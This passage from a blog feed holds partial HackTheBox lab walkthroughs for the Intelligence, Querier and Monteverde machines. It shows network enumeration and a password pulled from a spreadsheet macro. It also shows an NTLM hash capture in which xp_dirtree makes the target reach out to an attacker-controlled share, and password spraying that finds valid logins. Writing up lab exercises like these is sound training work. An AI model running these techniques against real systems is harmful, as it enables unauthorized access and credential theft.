3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-06T23:11:56+00:00; +6h59m24s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after: 2022-04-19T00:43:16
9389/tcp open mc-nmf .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time:
| date: 2023-09-06T23:11:17
|_ start_date: N/A
|_clock-skew: mean: 6h59m23s, deviation: 0s, median: 6h59m23s
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled and required
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.24 seconds
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ sudo nmap -sU --top-ports 10 -sV -sC 10.10.10.248
[sudo] password for kali:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 17:23 BST
Nmap scan report for 10.10.10.248 (10.10.10.248)
Host is up (0.10s latency).
PORT STATE SERVICE VERSION
53/udp open domain Simple DNS Plus
67/udp open|filtered dhcps
123/udp open ntp NTP v3
| ntp-info:
|_
135/udp open|filtered msrpc
137/udp open|filtered netbios-ns
138/udp open|filtered netbios-dgm
161/udp open|filtered snmp
445/udp open|filtered microsoft-ds
631/udp open|filtered ipp
1434/udp open|filtered ms-sql-m
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: 6h59m24s
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>smb&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.248
Anonymous login successful
Sharename Type Comment
--------- ---- -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>dns&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ dig @dc.intelligence.htb intelligence.htb
; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.16-1-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @dc.intelligence.htb intelligence.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 1581
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;intelligence.htb. IN A
;; ANSWER SECTION:
intelligence.htb. 600 IN A 10.10.10.248
;; Query time: 95 msec
;; SERVER: 10.10.10.248#53(dc.intelligence.htb) (UDP)
;; WHEN: Wed Sep 06 17:29:23 BST 2023
;; MSG SIZE rcvd: 61
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ dig axfr @dc.intelligence.htb intelligence.htb
; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.16-1-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr @dc.intelligence.htb intelligence.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ dnsenum --dnsserver 10.10.10.248 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt intelligence.htb
dnsenum VERSION:1.2.6
----- intelligence.htb -----
Host&amp;#39;s addresses:
__________________
intelligence.htb. 600 IN A 10.10.10.248
Name Servers:
______________
dc.intelligence.htb. 3600 IN A 10.10.10.248
Mail (MX) Servers:
___________________
Trying Zone Transfers and getting Bind Versions:
_________________________________________________
unresolvable name: dc.intelligence.htb at /usr/bin/dnsenum line 900.
Trying Zone Transfer for intelligence.htb on dc.intelligence.htb ...
AXFR record query failed: no nameservers
Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:
________________________________________________________________________________________
dc.intelligence.htb. 3600 IN A 10.10.10.248
domaindnszones.intelligence.htb. 600 IN A 10.10.10.248
forestdnszones.intelligence.htb. 600 IN A 10.10.10.248
intelligence.htb class C netranges:
____________________________________
Performing reverse lookup on 0 ip addresses:
_____________________________________________
0 results out of 0 IP addresses.
intelligence.htb ip blocks:
____________________________
done.
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>ldap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.248 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base &amp;lt;&amp;gt; (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#
#
dn:
namingcontexts: DC=intelligence,DC=htb
namingcontexts: CN=Configuration,DC=intelligence,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingcontexts: DC=DomainDnsZones,DC=intelligence,DC=htb
namingcontexts: DC=ForestDnsZones,DC=intelligence,DC=htb
# search result
search: 2
result: 0 Success
# numResponses: 2
# numEntries: 1
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.248 -x -b &amp;#34;DC=intelligence,DC=htb&amp;#34;
# extended LDIF
#
# LDAPv3
# base &amp;lt;DC=intelligence,DC=htb&amp;gt; with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#
# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v4563
# numResponses: 1
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Web Server
&lt;ul>
&lt;li>&lt;code>contact@intelligence.htb&lt;/code>&lt;/li>
&lt;li>&lt;code>http://intelligence.htb/documents/2020-01-01-upload.pdf&lt;/code>&lt;/li>
&lt;li>&lt;code>http://intelligence.htb/documents/2020-12-15-upload.pdf&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/intelligence/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Querier</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/</link><pubDate>Wed, 06 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/</guid><description>&lt;h1 id="querier">Querier&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.125 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 03:05 BST
Stats: 0:06:52 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 72.17% done; ETC: 03:15 (0:02:39 remaining)
Nmap scan report for 10.10.10.125 (10.10.10.125)
Host is up (0.15s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT STATE SERVICE
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
1433/tcp open ms-sql-s
5985/tcp open wsman
47001/tcp open winrm
49664/tcp open unknown
49665/tcp open unknown
49666/tcp open unknown
49667/tcp open unknown
49668/tcp open unknown
49669/tcp open unknown
49670/tcp open unknown
49671/tcp open unknown
Nmap done: 1 IP address (1 host up) scanned in 693.11 seconds
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p135,139,445,1433,5985 -sC -sV 10.10.10.125 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 03:18 BST
Nmap scan report for 10.10.10.125 (10.10.10.125)
Host is up (0.13s latency).
PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds?
1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
| 10.10.10.125:1433:
| Target_Name: HTB
| NetBIOS_Domain_Name: HTB
| NetBIOS_Computer_Name: QUERIER
| DNS_Domain_Name: HTB.LOCAL
| DNS_Computer_Name: QUERIER.HTB.LOCAL
| DNS_Tree_Name: HTB.LOCAL
|_ Product_Version: 10.0.17763
| ms-sql-info:
| 10.10.10.125:1433:
| Version:
| name: Microsoft SQL Server 2017 RTM
| number: 14.00.1000.00
| Product: Microsoft SQL Server 2017
| Service pack level: RTM
| Post-SP patches applied: false
|_ TCP port: 1433
|_ssl-date: 2023-09-06T19:18:33+00:00; -7h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-09-06T14:05:43
|_Not valid after: 2053-09-06T14:05:43
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time:
| date: 2023-09-06T19:18:24
|_ start_date: N/A
|_clock-skew: mean: -7h00m00s, deviation: 0s, median: -7h00m00s
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled but not required
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.61 seconds
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>smb&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.125
Sharename Type Comment
--------- ---- -------
ADMIN$ Disk Remote Admin
C$ Disk Default share
IPC$ IPC Remote IPC
Reports Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
&lt;/code>&lt;/pre>&lt;h2 id="footholduser-1">Foothold/User #1&lt;/h2>
&lt;ul>
&lt;li>&lt;code>//10.10.10.125/Reports&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ smbclient -N //10.10.10.125/Reports
Try &amp;#34;help&amp;#34; to get a list of possible commands.
smb: \&amp;gt; ls
. D 0 Mon Jan 28 23:23:48 2019
.. D 0 Mon Jan 28 23:23:48 2019
Currency Volume Report.xlsm A 12229 Sun Jan 27 22:21:34 2019
5158399 blocks of size 4096. 828878 blocks available
smb: \&amp;gt; get &amp;#34;Currency Volume Report.xlsm&amp;#34;
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (23.7 KiloBytes/sec) (average 23.7 KiloBytes/sec)
smb: \&amp;gt; exit
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>We can use &lt;a href="https://github.com/decalage2/oletools" target="_blank" rel="noopener">oletools&lt;/a> to open &lt;code>xlsm&lt;/code> file&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ olevba &amp;#39;Currency Volume Report.xlsm&amp;#39;
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.11.4 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
WARNING For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls
in file: xl/vbaProject.bin - OLE stream: &amp;#39;VBA/ThisWorkbook&amp;#39;
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
&amp;#39; macro to pull data for client volume reports
&amp;#39;
&amp;#39; further testing required
Private Sub Connect()
Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset
Set conn = New ADODB.Connection
conn.ConnectionString = &amp;#34;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&amp;#34;
conn.ConnectionTimeout = 10
conn.Open
If conn.State = adStateOpen Then
&amp;#39; MsgBox &amp;#34;connection successful&amp;#34;
&amp;#39;Set rs = conn.Execute(&amp;#34;SELECT * @@version;&amp;#34;)
Set rs = conn.Execute(&amp;#34;SELECT * FROM volume;&amp;#34;)
Sheets(1).Range(&amp;#34;A1&amp;#34;).CopyFromRecordset rs
rs.Close
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls
in file: xl/vbaProject.bin - OLE stream: &amp;#39;VBA/Sheet1&amp;#39;
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type |Keyword |Description |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open |May open a file |
|Suspicious|Hex Strings |Hex-encoded strings were detected, may be |
| | |used to obfuscate strings (option --decode to|
| | |see all) |
+----------+--------------------+---------------------------------------------+
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Let&amp;rsquo;s connect using &lt;code>impacket-mssqlclient&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ impacket-mssqlclient reporting:&amp;#39;PcwTWTHRwryjc$c6&amp;#39;@10.10.10.125 -windows-auth
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 32576
[*] INFO(QUERIER): Line 1: Changed database context to &amp;#39;volume&amp;#39;.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="user-2">User #2&lt;/h2>
&lt;ul>
&lt;li>Let&amp;rsquo;s enumerate
&lt;ul>
&lt;li>&lt;a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>SQL&amp;gt; SELECT name FROM master.sys.databases;
name
--------------------------------------------------------------------------------------------------------------------------------
master
tempdb
model
msdb
volume
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>SQL&amp;gt; use volume;
[*] ENVCHANGE(DATABASE): Old Value: volume, New Value: volume
[*] INFO(QUERIER): Line 1: Changed database context to &amp;#39;volume&amp;#39;.
SQL&amp;gt; select * from volume.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
-------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------------------------------------------------------------------------------- ----------
SQL&amp;gt;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>SQL&amp;gt; select name from sys.database_principals;
name
--------------------------------------------------------------------------------------------------------------------------------
public
dbo
guest
INFORMATION_SCHEMA
sys
reporting
db_owner
db_accessadmin
db_securityadmin
db_ddladmin
db_backupoperator
db_datareader
db_datawriter
db_denydatareader
db_denydatawriter
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>SQL&amp;gt; SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;);
entity_name permission_name
-------------------------------------- ------------------------------------------------------------
server CONNECT SQL
server VIEW ANY DATABASE
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>We can try &lt;code>Relay attack&lt;/code> to steal &lt;code>NTLM&lt;/code>
&lt;ul>
&lt;li>&lt;a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server&lt;/a>&lt;/li>
&lt;li>Spawn &lt;code>responder&lt;/code>
&lt;ul>
&lt;li>&lt;code>sudo responder -I tun0&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;code>xp_dirtree '\\10.10.16.9\share'&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Monteverde</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/monteverde/</link><pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/monteverde/</guid><description>&lt;h1 id="monteverde">Monteverde&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.172 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 17:02 BST
Nmap scan report for 10.10.10.172 (10.10.10.172)
Host is up (0.095s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT STATE SERVICE
88/tcp open kerberos-sec
135/tcp open msrpc
139/tcp open netbios-ssn
389/tcp open ldap
464/tcp open kpasswd5
593/tcp open http-rpc-epmap
636/tcp open ldapssl
3268/tcp open globalcatLDAP
3269/tcp open globalcatLDAPssl
5985/tcp open wsman
9389/tcp open adws
49667/tcp open unknown
49673/tcp open unknown
49674/tcp open unknown
49676/tcp open unknown
49697/tcp open unknown
54886/tcp open unknown
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p88,135,139,389,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.10.172 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 17:38 BST
Nmap scan report for 10.10.10.172 (10.10.10.172)
Host is up (0.16s latency).
PORT STATE SERVICE VERSION
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-02 16:37:49Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open mc-nmf .NET Message Framing
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_smb2-security-mode: SMB: Couldn&amp;#39;t find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>smb&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>ldap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.172 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base &amp;lt;&amp;gt; (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#
#
dn:
namingcontexts: DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL
# search result
search: 2
result: 0 Success
# numResponses: 2
# numEntries: 1
&lt;/code>&lt;/pre>&lt;h2 id="foothold">Foothold&lt;/h2>
&lt;ul>
&lt;li>Will dump everything &lt;code>ldapsearch -H ldap://10.10.10.172 -x -b &amp;quot;DC=MEGABANK,DC=LOCAL&amp;quot;&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.172 -x -b &amp;#34;DC=MEGABANK,DC=LOCAL&amp;#34;
# extended LDIF
#
# LDAPv3
# base &amp;lt;DC=MEGABANK,DC=LOCAL&amp;gt; with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#
# MEGABANK.LOCAL
dn: DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=MEGABANK,DC=LOCAL
instanceType: 5
whenCreated: 20200102220515.0Z
whenChanged: 20230902160106.0Z
subRefs: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
subRefs: CN=Configuration,DC=MEGABANK,DC=LOCAL
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAD3ugOsMvMU+GSt3sotNcxQ==
uSNChanged: 77851
name: MEGABANK
objectGUID:: dF0ZQW9mmEa6eGdQmEH00A==
replUpToDateVector:: AgAAAAAAAAALAAAAAAAAAA97oDrDLzFPhkrd7KLTXMUFcAAAAAAAAHgMH
xQDAAAAR5FJQrVN102DFng19yhewBEwAQAAAAAAQO0DGwMAAAAwI/VDJY7GTL9LbBrQc6myECABAA
AAAABJ0GoZAwAAADOghEir6oNEsvEJ9u8wjngKwAAAAAAAALHzHxQDAAAATEU0VTJDIUOpC+muz1W
GHAzgAAAAAAAAFc0jFAMAAABlUzJYUqlcQa1wRtRT7+pYCbAAAAAAAAAH5x8UAwAAAF7963Yf1ZpM
jnEppodbjcsOAAEAAAAAAE3OshYDAAAAhz8WkG49/0eslA/vS3oKjgeQAAAAAAAA5BYfFAMAAAAPn
/fkzuNaRKsJOojPyQTJBoAAAAAAAAA5Ex8UAwAAAKdfSfADqmJLvDeHFzYjcqcL0AAAAAAAALqZIx
QDAAAASULD+GgHQU+OAWPs7IQ4IQ8QAQAAAAAAYz1oGQMAAAA=
creationTime: 133381440661787842
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
...
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>We can also use &lt;code>rpcclient&lt;/code>
&lt;ul>
&lt;li>&lt;a href="https://www.hackingarticles.in/active-directory-enumeration-rpcclient/" target="_blank" rel="noopener">https://www.hackingarticles.in/active-directory-enumeration-rpcclient/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration&lt;/a>&lt;/li>
&lt;li>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ rpcclient -U &amp;#34;&amp;#34; -N 10.10.10.172
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>rpcclient $&amp;gt; enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>rpcclient $&amp;gt; querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2 Name: AAD_987d7f2f57d2 Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos Name: Dimitris Galanos Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null) Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary Name: Ray O&amp;#39;Leary Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs Name: SABatchJobs Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan Name: Sally Morgan Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata Name: svc-ata Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp Name: svc-netapp Desc: (null)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>No more information we could retrieve
&lt;ul>
&lt;li>So we might try password spraying using &lt;code>crackmapexec&lt;/code>&lt;/li>
&lt;li>First, we will try using usernames as passwords
&lt;ul>
&lt;li>Then we might need to create different password list using names combinations
&lt;ul>
&lt;li>&lt;a href="https://github.com/digininja/CeWL" target="_blank" rel="noopener">CeWL&lt;/a>&lt;/li>
&lt;li>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ crackmapexec smb 10.10.10.172 -u users.list -p users.list
SMB 10.10.10.172 445 MONTEVERDE [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Now let&amp;rsquo;s enumerate &lt;code>smb&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
[+] IP: 10.10.10.172:445 Name: 10.10.10.172
Disk Permissions Comment
---- ----------- -------
ADMIN$ NO ACCESS Remote Admin
azure_uploads READ ONLY
C$ NO ACCESS Default share
E$ NO ACCESS Default share
IPC$ READ ONLY Remote IPC
NETLOGON READ ONLY Logon server share
SYSVOL READ ONLY Logon server share
users$ READ ONLY
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R users$
[+] IP: 10.10.10.172:445 Name: 10.10.10.172
Disk Permissions Comment
---- ----------- -------
users$ READ ONLY
.\users$\*
dr--r--r-- 0 Fri Jan 3 13:12:48 2020 .
dr--r--r-- 0 Fri Jan 3 13:12:48 2020 ..
dr--r--r-- 0 Fri Jan 3 13:15:23 2020 dgalanos
dr--r--r-- 0 Fri Jan 3 13:41:18 2020 mhope
dr--r--r-- 0 Fri Jan 3 13:14:56 2020 roleary
dr--r--r-- 0 Fri Jan 3 13:14:28 2020 smorgan
.\users$\mhope\*
dr--r--r-- 0 Fri Jan 3 13:41:18 2020 .
dr--r--r-- 0 Fri Jan 3 13:41:18 2020 ..
fw--w--w-- 1212 Fri Jan 3 14:59:24 2020 azure.xml
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Let&amp;rsquo;s get &lt;code>azure.xml&lt;/code> from &lt;code>mhope&lt;/code>&amp;rsquo;s directory&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ smbclient -U SABatchJobs //10.10.10.172/users$ --password &amp;#39;SABatchJobs&amp;#39;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>azure.xml&lt;/code>
&lt;ul>
&lt;li>Looks like we have a password&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ cat azure.xml
